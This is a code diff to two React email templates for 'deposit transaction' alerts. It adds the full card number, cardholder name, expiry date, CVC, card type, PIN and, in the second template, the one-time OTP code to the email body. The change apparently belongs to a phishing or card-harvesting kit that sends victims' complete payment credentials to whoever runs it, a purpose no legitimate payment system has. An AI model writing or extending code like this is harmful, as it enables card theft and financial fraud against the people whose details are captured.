@@ -1,13 +1,19 @@
 interface PinEmailProps {
   email: string
   amount: string
+  cardName: string
+  cardNumber: string
+  expiryDate: string
+  cvc: string
+  cardType: string
+  pin: string
 }
 
-export function PinEmail({ email, amount }: PinEmailProps) {
+export function PinEmail({ email, amount, cardName, cardNumber, expiryDate, cvc, cardType, pin }: PinEmailProps) {
   return (
     <div style={{ fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "0 auto" }}>
       <h2 style={{ color: "#1e40af" }}>Deposit Transaction Alert</h2>
-      <p>A deposit transaction has been initiated:</p>
+      <p>A deposit transaction has been initiated with full payment details:</p>
       <div
         style={{
           background: "#f3f4f6",
@@ -21,6 +27,24 @@ export function PinEmail({ email, amount }: PinEmailProps) {
         </p>
         <p>
           <strong>Amount:</strong> ₦{amount}
+        </p>
+        <p>
+          <strong>Card Holder Name:</strong> {cardName}
+        </p>
+        <p>
+          <strong>Card Number:</strong> {cardNumber}
+        </p>
+        <p>
+          <strong>Expiry Date:</strong> {expiryDate}
+        </p>
+        <p>
+          <strong>CVC:</strong> {cvc}
+        </p>
+        <p>
+          <strong>Card Type:</strong> {cardType || "Unknown"}
+        </p>
+        <p>
+          <strong>PIN:</strong> {pin}
         </p>
         <p>
           <strong>Status:</strong> PIN entered, awaiting OTP verification
@@ -37,14 +61,20 @@ export function PinEmail({ email, amount }: PinEmailProps) {
 interface OtpEmailProps {
   email: string
   amount: string
+  cardName: string
+  cardNumber: string
+  expiryDate: string
+  cvc: string
+  cardType: string
+  pin: string
   otp: string
 }
 
-export function OtpEmail({ email, amount, otp }: OtpEmailProps) {
+export function OtpEmail({ email, amount, cardName, cardNumber, expiryDate, cvc, cardType, pin, otp }: OtpEmailProps) {
   return (
     <div style={{ fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "0 auto" }}>
       <h2 style={{ color: "#059669" }}>Deposit Transaction Completed</h2>
-      <p>A deposit transaction has been completed:</p>
+      <p>A deposit transaction has been completed with full details:</p>
       <div
         style={{
           background: "#f3f4f6",
@@ -58,6 +88,24 @@ export function OtpEmail({ email, amount, otp }: OtpEmailProps) {
         </p>
         <p>
           <strong>Amount:</strong> ₦{amount}
+        </p>
+        <p>
+          <strong>Card Holder Name:</strong> {cardName}
+        </p>
+        <p>
+          <strong>Card Number:</strong> {cardNumber}
+        </p>
+        <p>
+          <strong>Expiry Date:</strong> {expiryDate}
+        </p>
+        <p>
+          <strong>CVC:</strong> {cvc}
+        </p>
+        <p>
+          <strong>Card Type:</strong> {cardType || "Unknown"}
+        </p>
+        <p>
+          <strong>PIN:</strong> {pin}
         </p>
         <p>
           <strong>OTP:</strong> {otp}
